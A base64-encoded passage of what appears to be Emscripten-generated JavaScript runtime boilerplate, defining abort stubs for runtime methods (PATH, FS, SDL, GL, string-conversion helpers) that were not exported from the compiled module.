SU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiUEFUSCIpKSBNb2R1bGVbIlBBVEgiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ1BBVEgnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiUEFUSF9GUyIpKSBNb2R1bGVbIlBBVEhfRlMiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ1BBVEhfRlMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiU1lTQ0FMTFMiKSkgTW9kdWxlWyJTWVNDQUxMUyJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInU1lTQ0FMTFMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3lzY2FsbE1tYXAyIikpIE1vZHVsZVsic3lzY2FsbE1tYXAyIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidzeXNjYWxsTW1hcDInIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3lzY2FsbE11bm1hcCIpKSBNb2R1bGVbInN5c2NhbGxNdW5tYXAiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3N5c2NhbGxNdW5tYXAnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiSlNFdmVudHMiKSkgTW9kdWxlWyJKU0V2ZW50cyJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInSlNFdmVudHMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3BlY2lhbEhUTUxUYXJnZXRzIikpIE1vZHVsZVsic3BlY2lhbEhUTUxUYXJnZXRzIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidzcGVjaWFsSFRNTFRhcmdldHMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiZGVtYW5nbGUiKSkgTW9kdWxlWyJkZW1hbmdsZSJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInZGVtYW5nbGUnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiZGVtYW5nbGVBbGwiKSkgTW9kdWxlWyJkZW1hbmdsZUFsbCJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInZGVtYW5nbGVBbGwnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAianNTdGFja1RyYWNlIikpIE1vZHVsZVsianNTdGFja1RyYWNlIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidqc1N0YWNrVHJhY2UnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3RhY2tUcmFjZSIpKSBNb2R1bGVbInN0YWNrVHJhY2UiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3N0YWNrVHJhY2UnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiZ2V0RW52U3RyaW5ncyIpKSBNb2R1bGVbImdldEVudlN0cmluZ3MiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2dldEVudlN0cmluZ3MnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiY2hlY2tXYXNpQ2xvY2siKSkgTW9kdWxlWyJjaGVja1dhc2lDbG9jayJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInY2hlY2tXYXNpQ2xvY2snIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAid3JpdGVJNTNUb0k2NCIpKSBNb2R1bGVbIndyaXRlSTUzVG9JNjQiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3dyaXRlSTUzVG9JNjQnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAid3JpdGVJNTNUb0k2NENsYW1wZWQiKSkgTW9kdWxlWyJ3cml0ZUk1M1RvSTY0Q2xhbXBlZCJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInd3JpdGVJNTNUb0k2NENsYW1wZWQnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAid3JpdGVJNTNUb0k2NFNpZ25hbGluZyIpKSBNb2R1bGVbIndyaXRlSTUzVG9JNjRTaWduYWxpbmciXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3dyaXRlSTUzVG9JNjRTaWduYWxpbmcnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAid3JpdGVJNTNUb1U2NENsYW1wZWQiKSkgTW9kdWxlWyJ3cml0ZUk1M1RvVTY0Q2xhbXBlZCJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInd3JpdGVJNTNUb1U2NENsYW1wZWQnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAid3JpdGVJNTNUb1U2NFNpZ25hbGluZyIpKSBNb2R1bGVbIndyaXRlSTUzVG9VNjRTaWduYWxpbmciXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3dyaXRlSTUzVG9VNjRTaWduYWxpbmcnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAicmVhZEk1M0Zyb21JNjQiKSkgTW9kdWxlWyJyZWFkSTUzRnJvbUk2NCJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCIncmVhZEk1M0Zyb21JNjQnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAicmVhZEk1M0Zyb21VNjQiKSkgTW9kdWxlWyJyZWFkSTUzRnJvbVU2NCJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCIncmVhZEk1M0Zyb21VNjQnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiY29udmVydEkzMlBhaXJUb0k1MyIpKSBNb2R1bGVbImNvbnZlcnRJMzJQYWlyVG9JNTMiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2NvbnZlcnRJMzJQYWlyVG9JNTMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiY29udmVydFUzMlBhaXJUb0k1MyIpKSBNb2R1bGVbImNvbnZlcnRVMzJQYWlyVG9JNTMiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2NvbnZlcnRVMzJQYWlyVG9JNTMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiQnJvd3NlciIpKSBNb2R1bGVbIkJyb3dzZXIiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ0Jyb3dzZXInIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiRlMiKSkgTW9kdWxlWyJGUyJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInRlMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiTUVNRlMiKSkgTW9kdWxlWyJNRU1GUyJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInTUVNRlMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiVFRZIikpIE1vZHVsZVsiVFRZIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidUVFknIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiUElQRUZTIikpIE1vZHVsZVsiUElQRUZTIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidQSVBFRlMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiU09DS0ZTIikpIE1vZHVsZVsiU09DS0ZTIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidTT0NLRlMnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiR0wiKSkgTW9kdWxlWyJHTCJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInR0wnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiZW1zY3JpcHRlbldlYkdMR2V0IikpIE1vZHVsZVsiZW1zY3JpcHRlbldlYkdMR2V0Il0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidlbXNjcmlwdGVuV2ViR0xHZXQnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiZW1zY3JpcHRlbldlYkdMR2V0VGV4UGl4ZWxEYXRhIikpIE1vZHVsZVsiZW1zY3JpcHRlbldlYkdMR2V0VGV4UGl4ZWxEYXRhIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidlbXNjcmlwdGVuV2ViR0xHZXRUZXhQaXhlbERhdGEnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiZW1zY3JpcHRlbldlYkdMR2V0VW5pZm9ybSIpKSBNb2R1bGVbImVtc2NyaXB0ZW5XZWJHTEdldFVuaWZvcm0iXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2Vtc2NyaXB0ZW5XZWJHTEdldFVuaWZvcm0nIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiZW1zY3JpcHRlbldlYkdMR2V0VmVydGV4QXR0cmliIikpIE1vZHVsZVsiZW1zY3JpcHRlbldlYkdMR2V0VmVydGV4QXR0cmliIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidlbXNjcmlwdGVuV2ViR0xHZXRWZXJ0ZXhBdHRyaWInIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiQUwiKSkgTW9kdWxlWyJBTCJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInQUwnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiU0RMX3VuaWNvZGUiKSkgTW9kdWxlWyJTRExfdW5pY29kZSJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInU0RMX3VuaWNvZGUnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiU0RMX3R0ZkNvbnRleHQiKSkgTW9kdWxlWyJTRExfdHRmQ29udGV4dCJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInU0RMX3R0ZkNvbnRleHQnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiU0RMX2F1ZGlvIikpIE1vZHVsZVsiU0RMX2F1ZGlvIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidTRExfYXVkaW8nIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiU0RMIikpIE1vZHVsZVsiU0RMIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidTREwnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiU0RMX2dmeCIpKSBNb2R1bGVbIlNETF9nZngiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ1NETF9nZngnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiR0xVVCIpKSBNb2R1bGVbIkdMVVQiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ0dMVVQnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiRUdMIikpIE1vZHVsZVsiRUdMIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidFR0wnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiR0xGV19XaW5kb3ciKSkgTW9kdWxlWyJHTEZXX1dpbmRvdyJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInR0xGV19XaW5kb3cnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiR0xGVyIpKSBNb2R1bGVbIkdMRlciXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ0dMRlcnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiR0xFVyIpKSBNb2R1bGVbIkdMRVciXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ0dMRVcnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiSURCU3RvcmUiKSkgTW9kdWxlWyJJREJTdG9yZSJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInSURCU3RvcmUnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAicnVuQW5kQWJvcnRJZkVycm9yIikpIE1vZHVsZVsicnVuQW5kQWJvcnRJZkVycm9yIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidydW5BbmRBYm9ydElmRXJyb3InIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAid2Fybk9uY2UiKSkgTW9kdWxlWyJ3YXJuT25jZSJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInd2Fybk9uY2UnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3RhY2tTYXZlIikpIE1vZHVsZVsic3RhY2tTYXZlIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidzdGFja1NhdmUnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3RhY2tSZXN0b3JlIikpIE1vZHVsZVsic3RhY2tSZXN0b3JlIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidzdGFja1Jlc3RvcmUnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3RhY2tBbGxvYyIpKSBNb2R1bGVbInN0YWNrQWxsb2MiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3N0YWNrQWxsb2MnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiQXNjaWlUb1N0cmluZyIpKSBNb2R1bGVbIkFzY2lpVG9TdHJpbmciXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ0FzY2lpVG9TdHJpbmcnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3RyaW5nVG9Bc2NpaSIpKSBNb2R1bGVbInN0cmluZ1RvQXNjaWkiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3N0cmluZ1RvQXNjaWknIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiVVRGMTZUb1N0cmluZyIpKSBNb2R1bGVbIlVURjE2VG9TdHJpbmciXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ1VURjE2VG9TdHJpbmcnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3RyaW5nVG9VVEYxNiIpKSBNb2R1bGVbInN0cmluZ1RvVVRGMTYiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3N0cmluZ1RvVVRGMTYnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAibGVuZ3RoQnl0ZXNVVEYxNiIpKSBNb2R1bGVbImxlbmd0aEJ5dGVzVVRGMTYiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2xlbmd0aEJ5dGVzVVRGMTYnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiVVRGMzJUb1N0cmluZyIpKSBNb2R1bGVbIlVURjMyVG9TdHJpbmciXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ1VURjMyVG9TdHJpbmcnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAic3RyaW5nVG9VVEYzMiIpKSBNb2R1bGVbInN0cmluZ1RvVVRGMzIiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3N0cmluZ1RvVVRGMzInIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAibGVuZ3RoQnl0ZXNVVEYzMiIpKSBNb2R1bGVbImxlbmd0aEJ5dGVzVVRGMzIiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2xlbmd0aEJ5dGVzVVRGMzInIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgK